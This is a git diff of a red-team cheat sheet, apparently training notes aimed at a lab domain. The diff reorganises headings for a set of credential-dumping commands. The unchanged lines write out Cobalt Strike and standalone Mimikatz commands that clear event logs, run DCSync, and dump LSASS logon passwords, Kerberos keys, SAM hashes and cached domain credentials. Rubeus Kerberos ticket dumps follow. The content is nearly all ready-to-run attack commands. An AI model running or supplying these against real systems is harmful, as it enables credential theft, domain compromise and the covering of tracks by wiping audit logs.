@@ -1,4 +1,4 @@
-### Cobalt Strike
+### Cobalt Strike Mimikatz
 logonpasswords contains msv,tspkg,wdigest,kerberos,ssp,credman,cloudap.
 ```powershell
 mimikatz !event::clear
@@ -18,30 +18,28 @@ mimikatz @lsadump::dcsync /domain:marvel.local /all /csv
 rev2self
 ```
 
-### NTLM RC4 Hash Dump
+### Native Mimikatz
+NTLM RC4 Hash Dump
 ```powershell
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > res1.txt
 type .\res1.txt | sls 'username|password|ntlm'
 ```
-
-### Kerberos AES256 Hash Dump
+Kerberos AES256 Hash Dump
 ```powershell
 mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit > res2.txt
 type .\res2.txt | sls 'username|password|des_cbc_md4'
 ```
-
-### Local Users Hash Dump (SAM)
+Local Users Hash Dump (SAM)
 ```powershell
 mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit > res3.txt
 type .\res3.txt | sls "user :|hash|aes256"
 ```
-
-### Domain Cached Credentials
+Domain Cached Credentials
 ```powershell
 mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" exit
 ```
 
-### Kerberos Tickets Dump
+### Rubeus Kerberos Tickets Dump
 ```powershell
 execute-assembly /root/Rubeus.exe triage
 execute-assembly /root/Rubeus.exe dump /nowrap > res4.txt
